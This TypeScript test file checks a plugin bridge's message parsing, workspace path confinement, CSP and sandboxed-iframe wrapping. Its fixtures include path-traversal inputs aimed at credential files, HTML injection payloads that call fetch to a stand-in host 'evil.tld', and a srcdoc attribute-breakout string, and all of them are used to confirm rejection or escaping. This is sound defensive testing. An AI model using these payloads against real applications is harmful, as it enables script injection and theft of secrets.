import { describe, expect, it } from "vitest";
import {
  PLUGIN_CONTENT_SECURITY_POLICY,
  PLUGIN_NEUTER_SCRIPT,
  createInitMessage,
  createUpdateMessage,
  fromPluginRelativePath,
  handlePluginGuestMessage,
  isPluginPreviewablePath,
  parsePluginGuestMessage,
  resolvePluginOpenFilePath,
  toPluginRelativePath,
  wrapPluginHostDocument,
  wrapPluginHtml,
  type PluginGuestHandlers,
  type PluginThemeTokens,
} from "./bridge";

const THEME: PluginThemeTokens = {
  colorScheme: "dark",
  background: "#18181b",
  foreground: "#fafafa",
  foregroundMuted: "#a1a1aa",
  border: "#27272a",
  accent: "#20744A",
  fontFamily: "ui-sans-serif",
  monoFontFamily: "ui-monospace",
  fontSize: 14,
};

function recordingHandlers() {
  const calls: string[] = [];
  const handlers: PluginGuestHandlers = {
    onReady: () => calls.push("ready"),
    onOpenFile: (input) => calls.push(`open-file:${input.path}:${input.lineStart ?? "-"}`),
  };
  return { calls, handlers };
}

describe("parsePluginGuestMessage", () => {
  it("ignores anything that is not a paseo:1 envelope", () => {
    expect(parsePluginGuestMessage(null)).toBeNull();
    expect(parsePluginGuestMessage("ready")).toBeNull();
    expect(parsePluginGuestMessage(42)).toBeNull();
    expect(parsePluginGuestMessage({ type: "ready" })).toBeNull();
    expect(parsePluginGuestMessage({ paseo: 2, type: "ready" })).toBeNull();
    expect(parsePluginGuestMessage({ paseo: "1", type: "ready" })).toBeNull();
    expect(parsePluginGuestMessage("{not json")).toBeNull();
  });

  it("ignores host messages echoed back by the native forwarder", () => {
    expect(
      parsePluginGuestMessage(
        createInitMessage({ kind: "sidebar-panel", cwd: "/w", workspaceId: null }, THEME),
      ),
    ).toBeNull();
    expect(
      parsePluginGuestMessage(
        createUpdateMessage({ kind: "sidebar-panel", cwd: "/w", workspaceId: null }, THEME),
      ),
    ).toBeNull();
  });

  it("ignores malformed guest payloads", () => {
    expect(parsePluginGuestMessage({ paseo: 1, type: "open-file" })).toBeNull();
    expect(parsePluginGuestMessage({ paseo: 1, type: "open-file", path: "  " })).toBeNull();
    expect(parsePluginGuestMessage({ paseo: 1, type: "exfiltrate" })).toBeNull();
    expect(parsePluginGuestMessage({ paseo: 1, type: "resize", height: 240 })).toBeNull();
  });

  it("rejects open-file paths that reach outside the workspace", () => {
    for (const path of [
      "/etc/passwd",
      "/home/me/.npmrc",
      "C:\\Users\\me\\.npmrc",
      "\\\\server\\share\\secret",
      "~",
      "~/.npmrc",
      "~\\.npmrc",
      "../../.env",
      "src/../../.ssh/id_rsa",
      "  /etc/passwd  ",
    ]) {
      expect(parsePluginGuestMessage({ paseo: 1, type: "open-file", path })).toBeNull();
    }
  });

  it("normalises the workspace-relative paths it does accept", () => {
    expect(parsePluginGuestMessage({ paseo: 1, type: "open-file", path: "./src/./a.ts" })).toEqual({
      paseo: 1,
      type: "open-file",
      path: "src/a.ts",
    });
    expect(parsePluginGuestMessage({ paseo: 1, type: "open-file", path: "src/x/../a.ts" })).toEqual(
      {
        paseo: 1,
        type: "open-file",
        path: "src/a.ts",
      },
    );
  });

  it("parses the two guest messages, from objects and from JSON strings", () => {
    expect(parsePluginGuestMessage({ paseo: 1, type: "ready" })).toEqual({
      paseo: 1,
      type: "ready",
    });
    expect(parsePluginGuestMessage('{"paseo":1,"type":"ready"}')).toEqual({
      paseo: 1,
      type: "ready",
    });
    expect(
      parsePluginGuestMessage({ paseo: 1, type: "open-file", path: "src/a.ts", lineStart: 12.7 }),
    ).toEqual({
      paseo: 1,
      type: "open-file",
      path: "src/a.ts",
      lineStart: 12,
    });
  });
});

describe("handlePluginGuestMessage", () => {
  it("dispatches each guest message and reports whether it handled it", () => {
    const { calls, handlers } = recordingHandlers();

    expect(handlePluginGuestMessage({ paseo: 1, type: "ready" }, handlers)).toBe(true);
    expect(handlePluginGuestMessage({ paseo: 1, type: "open-file", path: "a.ts" }, handlers)).toBe(
      true,
    );

    expect(calls).toEqual(["ready", "open-file:a.ts:-"]);
  });

  it("calls nothing for foreign or malformed messages", () => {
    const { calls, handlers } = recordingHandlers();

    expect(handlePluginGuestMessage({ source: "react-devtools-bridge" }, handlers)).toBe(false);
    expect(handlePluginGuestMessage({ paseo: 1 }, handlers)).toBe(false);
    expect(handlePluginGuestMessage(undefined, handlers)).toBe(false);

    expect(calls).toEqual([]);
  });

  it("answers ready with an init carrying the context and resolved theme", () => {
    const context = { kind: "file-preview", path: "/w/data.csv", content: "a,b\n1,2" } as const;
    const sent: unknown[] = [];
    const handlers: PluginGuestHandlers = {
      onReady: () => sent.push(createInitMessage(context, THEME)),
      onOpenFile: () => {},
    };

    handlePluginGuestMessage({ paseo: 1, type: "ready" }, handlers);

    expect(sent).toEqual([{ paseo: 1, type: "init", context, theme: THEME }]);
  });
});

describe("plugin path round trip", () => {
  const ROOT = "/home/dev/project";

  // The documented example plugin echoes back the `path` it was handed. That is
  // the one call every plugin makes, and it silently did nothing while the host
  // sent absolutes into a resolver that rejects them.
  it("accepts the path it handed the plugin, and lands back where it started", () => {
    for (const absolute of [`${ROOT}/src/a.ts`, `${ROOT}/README.md`, `${ROOT}/a/b/c.txt`]) {
      const given = toPluginRelativePath(ROOT, absolute);
      expect(given, absolute).not.toBeNull();
      expect(resolvePluginOpenFilePath(given ?? "")).toBe(given);
      expect(fromPluginRelativePath(ROOT, given ?? "")).toBe(absolute);
    }
  });

  it("still refuses what the plugin makes up", () => {
    for (const path of ["/etc/passwd", "~/.ssh/id_rsa", "../../etc/passwd", "  ", ""]) {
      expect(resolvePluginOpenFilePath(path)).toBeNull();
    }
  });

  // The file pane can preview these; a plugin must not be offered them, because
  // there is no relative path to hand over and the absolute one leaks $HOME.
  it("reports a file outside the workspace as not previewable by a plugin", () => {
    for (const outside of ["/etc/passwd", "~/.npmrc", "/home/dev/other-project/a.ts"]) {
      expect(toPluginRelativePath(ROOT, outside), outside).toBeNull();
      expect(isPluginPreviewablePath(ROOT, outside), outside).toBe(false);
    }
    expect(isPluginPreviewablePath(ROOT, `${ROOT}/src/a.ts`)).toBe(true);
  });

  it("tolerates a trailing slash on the root", () => {
    expect(fromPluginRelativePath(`${ROOT}/`, "src/a.ts")).toBe(`${ROOT}/src/a.ts`);
  });
});

describe("wrapPluginHtml", () => {
  const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${PLUGIN_CONTENT_SECURITY_POLICY}">`;
  const SHELL_PREFIX = `<!doctype html><html><head>${CSP_META}<script>${PLUGIN_NEUTER_SCRIPT}</script></head><body><script>`;

  // Every one of these defeats a regex that hunts for the plugin's own <head>:
  // the match is inside a comment, inside an attribute value, or absent, and the
  // meta lands where the parser never treats it as an element.
  const HOSTILE = [
    "<!-- <head> --><script>fetch('https://evil.tld')</script>",
    '<p title="<head>">x</p><script>fetch("https://evil.tld")</script>',
    "<html><!-- <head> --><body>x</body></html>",
    "<script>fetch('https://evil.tld')</script>",
    "<html><head><title>x</title></head><body>hi</body></html>",
    '<html lang="en"><body>hi</body></html>',
    "<p>hi</p>",
    "",
  ];

  it("always emits its own shell with the CSP first in head", () => {
    for (const html of HOSTILE) {
      expect(wrapPluginHtml(html).startsWith(SHELL_PREFIX), html).toBe(true);
      expect(wrapPluginHtml(html).indexOf(CSP_META)).toBe("<!doctype html><html><head>".length);
    }
  });

  // The plugin is carried as a JS string and inserted, so the document parser
  // never sees its markup — that is what takes `<template shadowrootmode>` away,
  // and it also means no plugin byte can appear as markup in our own shell.
  it("carries the plugin as data, not as markup", () => {
    for (const html of HOSTILE.filter((entry) => entry.length > 0)) {
      const wrapped = wrapPluginHtml(html);
      expect(wrapped, html).toContain(JSON.stringify(html).slice(1, -1).replace(/<\//g, "<\\/"));
      expect(wrapped, html).not.toContain(`<body>${html}`);
    }
  });

  it("never emits a closing script tag from plugin content", () => {
    const wrapped = wrapPluginHtml("<script>fetch('https://evil.tld')</script><p>x</p>");
    // One unescaped `</script>` ends our shell script early and the rest of the
    // plugin lands as markup in a document that has run none of the neutering.
    expect(wrapped.match(/<\/script>/g)).toHaveLength(2);
  });

  // Native used to load the plugin as the WebView's top document, which is what
  // made it the odd platform out: with no `sandbox` attribute anywhere, a frame
  // the plugin creates inherits the parent's origin instead of getting a fresh
  // opaque one, so `frames[0].RTCPeerConnection` is readable synchronously and
  // no observer gets a turn in between.
  describe("wrapPluginHostDocument", () => {
    // Assert on the host document with the guest cut out of it. The escaper
    // leaves `'` and every unquoted word alone, so `toContain` against the whole
    // string matches the guest's own copy of whatever you are looking for: an
    // earlier version of these tests passed with the host `<meta>` deleted.
    function hostOnly(html: string): string {
      const host = wrapPluginHostDocument(html);
      const start = host.indexOf('srcdoc="');
      const end = host.indexOf('"', start + 'srcdoc="'.length);
      return host.slice(0, start) + host.slice(end);
    }

    it("renders the plugin in a sandboxed frame with no same-origin escape", () => {
      const host = hostOnly("<p>hi</p>");
      expect(host).toContain('<iframe id="paseo-plugin" sandbox="allow-scripts"');
      expect(host).not.toContain("allow-same-origin");
      expect(host).not.toContain("allow-popups");
      expect(host).not.toContain("allow-forms");
      expect(host).not.toContain("allow-top-navigation");
    });

    // The guest inherits this document's policy, so a narrower hand-written copy
    // silently subtracts from the plugin's: an earlier one omitted `img-src`,
    // which killed every data-URL image on native and nowhere else.
    it("carries the same policy as the guest, not a copy of it", () => {
      expect(hostOnly("")).toContain(
        `<meta http-equiv="Content-Security-Policy" content="${PLUGIN_CONTENT_SECURITY_POLICY}">`,
      );
      expect(PLUGIN_CONTENT_SECURITY_POLICY).toContain("frame-src 'none'");
    });

    it("escapes the plugin so it cannot break out of the srcdoc attribute", () => {
      const host = wrapPluginHostDocument('"><script>fetch("https://evil.tld")</script>');
      // Nothing the plugin wrote may appear as markup in the host document: one
      // unescaped quote closes `srcdoc` and the rest runs in the host realm,
      // which is the realm with the bridge in it.
      expect(host).not.toContain('"><script>fetch');
      expect(host).toContain("&quot;&gt;&lt;script&gt;");
    });

    it("still puts the CSP and the neutering script in front of the plugin", () => {
      const host = wrapPluginHostDocument("<p>hi</p>");
      expect(host).toContain(
        `&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;${PLUGIN_CONTENT_SECURITY_POLICY}&quot;&gt;`,
      );
      expect(host).toContain("RTCPeerConnection");
    });
  });

  it("denies network, storage, forms, and base rewriting in the policy it injects", () => {
    expect(PLUGIN_CONTENT_SECURITY_POLICY).toBe(
      "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'; base-uri 'none'; frame-src 'none'; object-src 'none'",
    );
  });
});
